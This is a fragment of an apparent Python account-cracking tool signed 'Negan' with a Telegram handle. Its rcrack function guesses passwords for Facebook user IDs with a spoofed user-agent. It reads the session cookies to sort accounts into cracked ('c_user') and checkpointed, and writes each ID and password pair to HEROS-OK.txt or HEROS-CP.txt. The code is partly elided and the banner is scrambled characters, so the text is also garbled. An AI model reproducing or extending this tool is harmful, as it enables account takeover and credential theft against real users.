...
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j      𝙈𝙊𝙃𝘼𝙈𝙀𝘿 𝙊𝙈𝘼𝙍 𝙇𝘼𝙈𝙇𝙊𝙈            (𝙉𝙀𝙂𝘼𝙉)  u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
...
𝙉𝙀𝙂𝘼𝙉 𝙇𝙔
\033[1;33m----------------------------------------------
 \033[1;31mname    : \033[1;34𝙉𝙚𝙜𝙖𝙣
 \033[1;31mtele  : \033[1;34m @md3lm
\033[1;33m----------------------------------------------""")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5373.119 Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HEROS-OK] '+cid+'|'+ps+'\033[0;97m')
                open('HEROS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HEROS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HEROS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mHEROS\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
